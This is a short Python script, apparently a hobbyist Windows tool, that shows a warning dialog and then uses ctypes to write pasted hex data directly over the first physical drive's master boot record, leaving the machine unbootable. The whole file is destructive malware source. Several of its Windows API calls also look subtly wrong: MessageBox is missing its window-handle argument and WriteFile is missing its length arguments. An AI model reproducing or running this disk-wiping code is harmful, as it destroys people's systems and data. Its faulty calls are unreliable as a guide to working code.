import ctypes
from sys import exit

hex_data = bytes([ paste hex data here eg. 0xAAB83, ... ])

# title of warning
warningtitle = 'Warning!'
# description of warning
dll = ctypes.windll
warningdescription = 'This program will overwrite your MBR, making your machine unusable. If your in a safe enviroment (a virtual machine for example) and know what you\'re doing you might continute. Are you really sure you want to make your machine unbootable?'

if dll.User32.MessageBox(warningdescription, warningtitle, 0x00000030 | 0x00000004) == 7: # send warning and check if no is pressed
  exit() # exit the program

hDevice = dll.Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) # Create a handle to our Physical Drive
dll.Kernel32.WriteFile(hDevice, hex_data, None) # Overwrite the MBR! (Never run this on your main machine!)
dll.Kernel32.CloseHandle(hDevice) # Close the handle to our Physical Drive!

dll.User32.MessageBox("Your MBR is overwritten!", "Oh No!", 0x00000030 | 0x00000000)
